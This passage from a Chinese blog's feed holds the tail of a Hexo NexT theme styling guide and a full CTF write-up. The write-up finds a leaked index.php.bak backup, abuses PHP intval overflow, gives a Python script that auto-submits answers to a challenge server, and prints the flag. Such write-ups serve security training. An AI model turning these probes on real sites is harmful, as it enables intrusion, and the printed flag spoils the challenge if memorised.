等在同一目录下</p><p>在 _data 文件夹里面新建 <code>variables.styl</code>,在这个里面添加下面的语句</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 圆角设置</span><br><span class="line">$<span class="attribute">border-radius</span>-inner     = <span class="number">20px</span> <span class="number">20px</span> <span class="number">20px</span> <span class="number">20px</span>;</span><br><span class="line">$<span class="attribute">border-radius</span>           = <span class="number">20px</span>;</span><br></pre></td></tr></table></figure><p>同时打开 NexT 的配置文件 _config.yml，找到下面语句，去掉注释，这一句大概在 32 行</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">variable:</span> <span class="string">source/_data/variables.styl</span></span><br></pre></td></tr></table></figure><h1 id="设置背景图片"><a href="#设置背景图片" class="headerlink" title="设置背景图片"></a>设置背景图片</h1><h2 id="更改图片背景"><a href="#更改图片背景" class="headerlink" title="更改图片背景"></a>更改图片背景</h2><p>还是在 _data 文件夹里面新建 <code>styles.styl</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//背景图片设置</span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">/images/R-C.jpg</span>);</span><br><span class="line">    <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">    <span class="attribute">background-attachment</span>: fixed;</span><br><span class="line">    <span class="attribute">background-size</span>: <span class="number">100%</span> <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>background-image:url</code> 为图片路径，可以直接使用链接，也可以是图片路径（将自定义图片放入<code>themes/next/source/images</code>路径下）</li><li><code>background-repeat</code>：若果背景图片不能全屏，那么是否平铺显示，充满屏幕</li><li><code>background-attachment</code>：背景是否随着网页上下滚动而滚动，fixed 为固定</li><li><code>background-size</code>：图片展示大小，这里设置 100%，100% 的意义为：如果背景图片不能全屏，那么是否通过拉伸的方式将背景强制拉伸至全屏显示</li></ul><p>接下来打开 _config.yml ，找到这一行(34 行)，去除注释</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">style:</span> <span class="string">source/_data/styles.styl</span></span><br></pre></td></tr></table></figure><h2 id="页面透明化"><a href="#页面透明化" class="headerlink" title="页面透明化"></a>页面透明化</h2><p>为了更好的欣赏背景图片，可以将博客的界面透明化，在 styles.styl 里面添加下面的内容，也可以自己修改一些参数</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//文章内容的透明度设置</span><br><span class="line"><span class="selector-class">.content-wrap</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.9</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//侧边框的透明度设置</span><br><span class="line"><span class="selector-class">.sidebar</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: transparent;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.9</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//菜单栏的透明度设置</span><br><span class="line"><span class="selector-class">.header-inner</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.9</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="隐藏网页底部-powered-By"><a href="#隐藏网页底部-powered-By" class="headerlink" title="隐藏网页底部 powered By"></a>隐藏网页底部 powered By</h1><p>打开 <code>themes/next/layout/_partials/footer.swig</code></p><p>找到下面的代码，应该在最底下，用 <code>&lt;!--   --&gt;</code>注释掉</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">&#123;%- <span class="keyword">if</span> theme.footer.powered %&#125;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">powered</span>-<span class="title">by</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    </span>&#123;%- set next_site = <span class="string">&#x27;https://theme-next.org&#x27;</span> %&#125;</span><br><span class="line">    &#123;%- <span class="keyword">if</span> theme.scheme !== <span class="string">&#x27;Gemini&#x27;</span> %&#125;</span><br><span class="line">      &#123;%- set next_site = <span class="string">&#x27;https://&#x27;</span> + theme.scheme | lower + <span class="string">&#x27;.theme-next.org&#x27;</span> %&#125;</span><br><span class="line">    &#123;%- <span class="keyword">endif</span> %&#125;</span><br><span class="line">    &#123;&#123;- <span class="title function_ invoke__">__</span>(<span class="string">&#x27;footer.powered&#x27;</span>, <span class="title function_ invoke__">next_url</span>(<span class="string">&#x27;https://hexo.io&#x27;</span>, <span class="string">&#x27;Hexo&#x27;</span>, &#123;<span class="attr">class</span>: <span class="string">&#x27;theme-link&#x27;</span>&#125;) + <span class="string">&#x27; &amp; &#x27;</span> + <span class="title function_ invoke__">next_url</span>(next_site, <span class="string">&#x27;NexT.&#x27;</span> + theme.scheme, &#123;<span class="attr">class</span>: <span class="string">&#x27;theme-link&#x27;</span>&#125;)) &#125;&#125;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&#123;%- <span class="keyword">endif</span> %&#125;</span><br><span class="line"></span><br><span class="line">&#123;%- <span class="keyword">if</span> theme.add_this_id %&#125;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">addthis_inline_share_toolbox</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">script</span> <span class="title">src</span>=&quot;//<span class="title">s7</span>.<span class="title">addthis</span>.<span class="title">com</span>/<span class="title">js</span>/300/<span class="title">addthis_widget</span>.<span class="title">js</span>#<span class="title">pubid</span>=</span>&#123;&#123; theme.add_this_id &#125;&#125;<span class="string">&quot; async=&quot;</span>async<span class="string">&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">  &lt;/div&gt;</span></span><br><span class="line"><span class="string">&#123;%- endif %&#125;</span></span><br><span class="line"><span class="string">--&gt;</span></span><br></pre></td></tr></table></figure><h1 id="设置图标"><a href="#设置图标" class="headerlink" title="设置图标"></a>设置图标</h1><h2 id="网站图标"><a href="#网站图标" class="headerlink" title="网站图标"></a>网站图标</h2><p>网站的默认图标是 NexT 的图标，我们可以自行修改</p><p>首先要找一张 ico 图标，可以自己制作或者别的网站去找，我是在<a href="https://www.logosc.cn/logo/monogram">这里</a>找的，它可以自动生成符合的 ico 图标格式</p><p>把图标放在 <code>/themes/next/source/images</code>里面，打开 _config.yml 配置文件，找到下面语句，将后面的图片修改为你想要改的图片</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">favicon:</span></span><br><span class="line">  <span class="attr">small:</span> <span class="string">/images/favicon-16x16-next.png</span></span><br><span class="line">  <span class="attr">medium:</span> <span class="string">/images/favicon-32x32-next.png</span></span><br><span class="line">  <span class="attr">apple_touch_icon:</span> <span class="string">/images/apple-touch-icon-next.png</span></span><br><span class="line">  <span class="attr">safari_pinned_tab:</span> <span class="string">/images/logo.svg</span></span><br></pre></td></tr></table></figure><h2 id="标签图标"><a href="#标签图标" class="headerlink" title="标签图标"></a>标签图标</h2><p>我们界面底下标签的前面 是一个 # 号，我们也可以将其修改为图标</p><p>找到模板<code>/themes/next/layout/_macro/post.swig</code>，在里面找到 242 行</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">a</span> href=&quot;&#123;&#123; url_for(tag<span class="selector-class">.path</span>) &#125;&#125;&quot; rel=&quot;tag&quot;&gt;&#123;&#123; tag_indicate &#125;&#125; &#123;&#123; tag<span class="selector-class">.name</span> &#125;&#125;&lt;/<span class="selector-tag">a</span>&gt;</span><br></pre></td></tr></table></figure><p>修改为</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">a</span> href=&quot;&#123;&#123; url_for(tag<span class="selector-class">.path</span>) &#125;&#125;&quot; rel=&quot;tag&quot;&gt;&lt;<span class="selector-tag">i</span> class=&quot;fa fa-tag&quot;&gt;&#123;&#123; tag<span class="selector-class">.name</span> &#125;&#125;&lt;/<span class="selector-tag">i</span>&gt;&lt;/<span class="selector-tag">a</span>&gt;</span><br></pre></td></tr></table></figure><h1 id="增加字数统计和阅读时长功能"><a href="#增加字数统计和阅读时长功能" class="headerlink" title="增加字数统计和阅读时长功能"></a>增加字数统计和阅读时长功能</h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;好不容易弄好了图片问题，就想着去美化一下主题，起码现在的功能太少了&lt;/p&gt;</summary>
    
    
    
    <category term="setting" scheme="https://s1ient.github.io/categories/setting/"/>
    
    
    <category term="NexT" scheme="https://s1ient.github.io/tags/NexT/"/>
    
    <category term="setting" scheme="https://s1ient.github.io/tags/setting/"/>
    
  </entry>
  
  <entry>
    <title>[NCTF 2018]小绿草之最强大脑</title>
    <link href="https://s1ient.github.io/post/f65bc688.html"/>
    <id>https://s1ient.github.io/post/f65bc688.html</id>
    <published>2023-03-08T11:55:47.000Z</published>
    <updated>2023-05-10T05:57:59.658Z</updated>
    
    <content type="html"><![CDATA[<p>[NCTF 2018]小绿草之最强大脑</p><span id="more"></span><p>进去是一个计算的东西。这个自己算肯定不行的</p><p><img src="/../image/03-08-01/1.png" alt="1"><br>查看下源码代，发现有源码泄露，访问 index.php.bak 下载了一个文件，打开是 php 代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;ans&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ans&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$_SESSION</span>[<span class="string">&#x27;ans&#x27;</span>])+<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;input&#x27;</span>])!=<span class="variable">$_POST</span>[<span class="string">&#x27;ans&#x27;</span>])&#123;</span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;script language=&quot;javascript&quot;&gt;  </span></span><br><span class="line"><span class="string">alert(&quot;怎么没算对呢？&quot;);  </span></span><br><span class="line"><span class="string">window.history.back(-1);  &lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">time</span>())-<span class="variable">$_SESSION</span>[<span class="string">&#x27;time&#x27;</span>]&lt;<span class="number">1</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;script language=&quot;javascript&quot;&gt;  </span></span><br><span class="line"><span class="string">alert(&quot;你手速太快啦，服务器承受不住!!!&quot;);  </span></span><br><span class="line"><span class="string">window.history.back(-1); &lt;/script&gt; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">time</span>())-<span class="variable">$_SESSION</span>[<span class="string">&#x27;time&#x27;</span>]&gt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;script language=&quot;javascript&quot;&gt;  </span></span><br><span class="line"><span class="string">alert(&quot;你算的太慢了少年！&quot;);  </span></span><br><span class="line"><span class="string">window.history.back(-1); &lt;/script&gt; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;script language=&quot;javascript&quot;&gt;  </span></span><br><span class="line"><span class="string">alert(&quot;tql，算对了！！&quot;);  </span></span><br><span class="line"><span class="string">     &lt;/script&gt; &#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;count&#x27;</span>]++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里使用了 intval 函数，这个函数会获取变量的整数值，根据<a href="https://www.runoob.com/php/php-intval-function.html">描述</a>，64 位系统上，最大带符号的 integer 值是 9223372036854775807</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;420000000000000000000&#x27;</span>);</span><br><span class="line"><span class="comment">// 输出结果为 9223372036854775807</span></span><br></pre></td></tr></table></figure><p>且上面的数刚好满足 21 位<br>php 源码在 if 函数中要求回答时间在 1~2s 之间，这显然不是人力所能达到的，所以我们需要利用到 python 来编写脚本回答问题<br>python 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">s = requests.Session()  <span class="comment"># 因为要连续计算，用来保存当前会话的持续有效性</span></span><br><span class="line">url = <span class="string">&quot;http://1.14.71.254:28978/&quot;</span> <span class="comment">#这里修改为你的题目网址</span></span><br><span class="line">number =<span class="string">&quot;4200000000000000000000&quot;</span>  <span class="comment">#输入的数字</span></span><br><span class="line">proxies = &#123; <span class="string">&quot;http&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;https&quot;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">r = s.get(url,proxies=proxies)</span><br><span class="line">math = <span class="string">&#x27;&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># response = requests.get(url, headers=headers,proxies=proxies)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    num_pattern =re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;div style=&quot;display:inline;&quot;&gt;(.*?)&lt;/div&gt;&#x27;</span>)</span><br><span class="line">    num = num_pattern.findall(r.text)   <span class="comment">#正则提取公式</span></span><br><span class="line">    gg = <span class="string">&quot;9223372036854775807&quot;</span>+<span class="string">&#x27;+&#x27;</span>+math.join(num)[<span class="number">0</span>:-<span class="number">1</span>]  <span class="comment">#拼接真实的公式</span></span><br><span class="line">    <span class="built_in">print</span>(gg)</span><br><span class="line">    ans = <span class="built_in">eval</span>(gg)   <span class="comment">#利用eval直接来计算结果</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line">    data = <span class="string">&quot;input=&#123;number&#125;&amp;ans=&#123;ans&#125;%&quot;</span>.<span class="built_in">format</span>(number=number,ans=ans)</span><br><span class="line"></span><br><span class="line">    r =s.post(url,headers=headers,data=data,proxies=proxies)</span><br><span class="line">    time.sleep(<span class="number">1.5</span>)   <span class="comment">#延时1.5秒</span></span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../image/03-08-01/run_result.png" alt="run_result"></p><p>得到 flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;Y0u_ar3_th3_sTr0ng3st_br41n&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;[NCTF 2018]小绿草之最强大脑&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="https://s1ient.github.io/categories/web/"/>
    
    
    <category term="web" scheme="https://s1ient.github.io/tags/web/"/>
    
    <category term="源码泄露" scheme="https://s1ient.github.io/tags/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    
    <category term="php" scheme="https://s1ient.github.io/tags/php/"/>
    
  </entry>
  
</feed>
